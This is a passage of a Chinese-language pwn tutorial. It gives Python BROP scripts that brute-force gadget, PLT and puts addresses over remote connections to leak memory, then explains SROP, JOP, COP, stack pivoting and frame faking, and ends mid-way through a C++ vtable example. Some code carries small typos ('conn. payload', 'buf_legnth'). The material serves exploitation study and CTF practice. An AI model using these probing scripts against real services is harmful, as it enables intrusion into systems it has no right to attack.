class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            conn_send_recv(conn. payload + p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>找到stop gadgets以后就成功了一半了，剩下的就是寻找plt的地址以及遍历plt找到puts的地址。首先是寻找plt的exp，注意程序可能不止一处连续16次都不崩溃，所以最好根据不同的start_addr多尝试几次。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plt</span>(<span class="params">start_addr, buf_length, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    addr = start_addr  <span class="comment"># Which address you want to start.</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64(stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">16</span>:</span><br><span class="line">                <span class="keyword">return</span> addr - <span class="number">16</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            count = <span class="number">0</span></span><br></pre></td></tr></table></figure>



<p>寻找csu中的gadgets地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csu</span>(<span class="params">buf_legnth, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">6</span>  <span class="comment"># 6 traps</span></span><br><span class="line">    payload += p64(stop_gadgets)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 traps</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote()</span><br><span class="line">            output = conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>找到csu的gadgets地址以后，通过偏移9就可以得到<code>pop rdi; ret</code>的gadgets，这样我们就可以控制puts的参数，然后是寻找puts的plt地址（其实也可以把step从16调整为1）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_plt</span>(<span class="params">plt_addr, buf_length, pop_rdi_ret, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    addr = plt_addr  <span class="comment"># plt address</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span>)  <span class="comment"># # ELF start address</span></span><br><span class="line">    payload += <span class="string">&#x27;%s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64(stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote()</span><br><span class="line">            output = conn_send_recv(conn, payload % p64(addr))</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">if</span> output.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            print(<span class="string">&#x27;[!] Crash found! Maybe invalid plt address. continue finding...&#x27;</span>)</span><br><span class="line">        addr += <span class="number">16</span></span><br></pre></td></tr></table></figure>



<p>最后就是调用puts打印各种地址内存了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span>(<span class="params">addr, puts_plt, buf_length, pop_rdi_ret, stop_gadgets, canary=None</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(stop_gadgets)</span><br><span class="line">   	data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = get_remote()</span><br><span class="line">        data = conn_send_recv(conn, payload)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        conn.close()</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>



<h2 id="0x89-SROP"><a href="#0x89-SROP" class="headerlink" title="0x89 SROP"></a>0x89 SROP</h2><p>SROP即Sigreturn-Oriented Programming（面向Sigreturn编程），sigreturn是一个系统调用，当unix系统发生signal的时候会被间接调用。</p>
<p>当内核向一个进程发送一个signal的时候，该进程会被暂时挂起，然后进入内核态，在进入内核态之前，内核会将进程的上下文保存在栈中，这个上下文被称为ucontext，其中包含了当前所有寄存器的值，之后将signal信息也就是siginfo压入栈中，然后将指向sigreturn系统调用的地址压入栈中，这样内核态执行完毕以后就可以执行sigreurn系统调用恢复保存在栈中的进程所有寄存器的值，其中，ucontext以及siginfo被称为Signal Frame。32位sigreturn的调用号位77，64位sigreturn的调用号位15。</p>
<p>32位系统下的Signal Frame结构如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>64位系统下的Signal Frame结构如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>由于整个Signal Frame都被保存在栈中，因此通过栈溢出我们可以读写对应的Signal Frame，这时内核态执行完毕以后调用sigreturn恢复进程寄存器的时候，我们就可以控制rip/eip的值，劫持控制流，我们也可以手动调用sigreturn系统调用，然后在栈上伪造一个Signal Frame，这样就可以控制所有寄存器的值。我们甚至可以伪造多个不同的Signal Frame执行不同的系统调用或函数，例如这个Frame可以调用read，另一个调用write等等。</p>
<p>实际上pwntools中已经集成了针对SROP的利用<code>SigreturnFrame()</code>，直接实例化一个这个类就可以很容易修改Signal Frame中寄存器的值，修改完成后将其转为str就得到了对应的payload，直接send即可，非常方便。</p>
<h2 id="0x8A-JOP"><a href="#0x8A-JOP" class="headerlink" title="0x8A JOP"></a>0x8A JOP</h2><p>JOP即Jump-Oriented Programming（面向跳转编程），说白了就是只用jmp寄存器完成getshell，例如<code>pop rax; jmp rax</code>，大致原理与ROP相同。</p>
<h2 id="0x8B-COP"><a href="#0x8B-COP" class="headerlink" title="0x8B COP"></a>0x8B COP</h2><p>COP即Call-Oriented Programming（面向调用编程），说白了就是只用call寄存器完成getshell，例如<code>pop rax; call rax</code>，大致原理与ROP相同。</p>
<h2 id="0x8C-Stack-Pivoting"><a href="#0x8C-Stack-Pivoting" class="headerlink" title="0x8C Stack Pivoting"></a>0x8C Stack Pivoting</h2><p>也称作栈迁移，如果可以控制栈顶指针sp，就可以将栈迁移到其他可读写的地址，通常情况下我们虽然可以很容易控制sp，但是其他方法就可以getshell，所以一般用不到栈迁移，但是在某些极端情况下栈迁移也是非常有用的：</p>
<ol>
<li>可以溢出的长度很少，无法构造较长的rop链</li>
<li>开启了PIE，我们不知道栈地址，可以控制sp的话就可以将栈迁移到已知地址</li>
<li>甚至可以将栈迁移到堆空间结合堆溢出控制栈上的内容</li>
</ol>
<p>攻击前提：</p>
<ol>
<li>可以劫持控制流</li>
<li>可以控制栈顶指针sp，例如<code>pop rsp; ret</code>这类的gadgets。其实万金油csu中就有现成的可以控制sp的gadget，位置在偏移+3处。</li>
</ol>
<h2 id="0x8D-Frame-Faking"><a href="#0x8D-Frame-Faking" class="headerlink" title="0x8D Frame Faking"></a>0x8D Frame Faking</h2><p>顾名思义，伪造一个函数栈劫持控制流，其实和栈迁移一样，只不过是将栈底迁移到已知的可控地址处，利用<code>leave; ret</code>gadgets来劫持控制流，即如果栈底可控，那么通过leave指令，栈顶也就可控，ret也可控。</p>
<p>leave指令相当于<code>move esp,ebp; pop ebp</code>，也就是<code>esp=ebp &amp;&amp; ebp=old_ebp</code>，如果我们可以通过栈溢出修改<code>old_ebp</code>为我们可控的地址<code>evil_ebp</code>，那么在执行leave的时候首先修改esp为ebp，之后修改ebp为我们的<code>evil_ebp</code>，现在栈底我们可控，之后执行ret指令，也就是<code>leave; ret</code>gadget，这时又会执行一次leave，esp就变成了我们的<code>evil_ebp</code>，那么这时候整个栈顶和栈底都到了我们可控的地址处，这时又修改ebp到其他地方（可以是我们控制的地方，不过已经无所谓了），然后执行gadget中的ret指令 ，但是这时整个栈都到了我们可控的地址处，也就是说我们可以任意控制栈上的内容，可以很容易构造其他rop链了。</p>
<p>其实说白了，栈伪造就是栈迁移的升级版，其利用范围和栈迁移一样，但是攻击前提就需要寻找到一条<code>levae; ret</code>这样的gadget，其实这种gadget很好找。栈伪造的原理如下所示，假设0x0开始是程序原本的栈，但是通过栈溢出我们只能修改ebp和ret，这时无法构造长的rop链，但是我们修改ebp为0x800010，也就是我们伪造的栈地址，修改ret为0x400070，也就是<code>leave; ret</code>gadget，执行完以后<code>leave; ret</code>gadget以后栈就会被迁移到0x800010处，这时我们就可以完全控制栈的内容了，可以构造任意长度的rop链。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x0 AAAA</span><br><span class="line">0x4 AAAA</span><br><span class="line">0x8 old_ebp (&#x3D;0x80001a)</span><br><span class="line">0xc ret (&#x3D;0x40075)</span><br><span class="line">...</span><br><span class="line">0x400070 leave; ret</span><br><span class="line">...</span><br><span class="line">0x800010 AAAA</span><br><span class="line">0x800014 gadgets_addr</span><br><span class="line">0x800018 gadgets_addr</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<h2 id="0x8E-Other-Tricks"><a href="#0x8E-Other-Tricks" class="headerlink" title="0x8E Other Tricks"></a>0x8E Other Tricks</h2><ol>
<li><p>控制rax/eax</p>
<p> 有时候系统调用需要我们控制al寄存器，但是类似<code>pop rax/eax; ret</code>这种gadgets很难找，这时若可以调用alarm函数，那么可以通过依次调用alarm(x)，alarm(0)即可将rax设置为x，而很多题目都会设置一个alarm定时终止程序防止过多的socket连接占用资源。其实不止alarm，其他函数在调用完成后也可能会修改部分寄存器的值。</p>
</li>
<li><p>栈重叠</p>
<p> 对于两个连续调用的函数，第一个函数执行完成后其栈桢被回收（即esp=ebp），但是被回收的栈上保存的内容并不会被清空，这时开始执行第二个函数，开辟新的栈桢，第二个函数开辟的栈桢中某些未初始化的局部变量的默认值可能会受到第一个函数中未被清空的局部变量的影响</p>
</li>
</ol>
<h1 id="0x9-C"><a href="#0x9-C" class="headerlink" title="0x9 C++"></a>0x9 C++</h1><p>对于C++的pwn大都针对于虚函数。C++支持多态与虚函数，基类的虚函数仅负责给出函数的定义，而该函数的具体实现由子类决定。由于在编译期间无法确定具体对象所调用的虚函数，因此C++主要通过动态绑定的方法实现了虚函数，即在程序运行过程中根据对象的实际类型决定调用哪个虚函数。简而言之，虚函数的目的就是为了通过一个基类指针可以调用子类的同名函数，而这一功能在编译期间无法实现，主要通过虚表进行延迟绑定实现。</p>
<p>每个包含虚函数的类都会有一个虚表（vtable），该类的所有对象共用一个虚表，虚表其实是一个指针数组，数组中每个元素都是一个指向一个虚函数的指针。虚表一般位于.rodata段中，位于类的定义数据的起始位置，只读不可写。在程序编译的时候虚表内容就已经确定。若一个子类继承了包含虚函数的类，该子类也有一个虚表，虚表中的指针会指向其继承树中最近的一个类的虚函数。类的每一个对象都保存一个指向该对象所属类的虚表的指针__vptr，当调用一个对象的虚函数的时候，通过该对象的虚表指针找到该类的虚表，之后在虚表中找到对应的函数地址并且调用。</p>
<p>假设有如下继承关系。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::vfunc1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::vfunc2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::func1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A::func2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_data1, m_data2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;B::vfunc1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;B::func1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_data3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span> <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;C::vfunc2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;C::func2()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> m_data1, m_data4;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    B b;</span><br><span class="line">    C c;</span><br><span class="line">    A *p;</span><br><span class="line">    </span><br><span class="line">    p = &amp;b;</span><br><span class="line">    p-&gt;func1();  <span class="comment">// A::func1()</span></span><br><span class="line">    p-&gt;func2();  <span class="comment">// A::func2()</span></span><br><span class="line">    p-&gt;vfunc1();  <span class="comment">// B::vfunc1()</span></span><br><span class="line">    p-&gt;vfunc2();  <span class="comment">// A::vfunc2()</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    p = &amp;c;</span><br><span class="line">    p-&gt;func1();  <span class="comment">// A::func1()</span></span><br><span class="line">    p-&gt;func2();  <span class="comment">// A::func2()</span></span><br><span class="line">    p-&gt;vfunc1();  <span class="comment">// B::vfun1()</span></span><br><span class="line">    p-&gt;vfunc2();  <span class="comment">// C::vfun2()</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 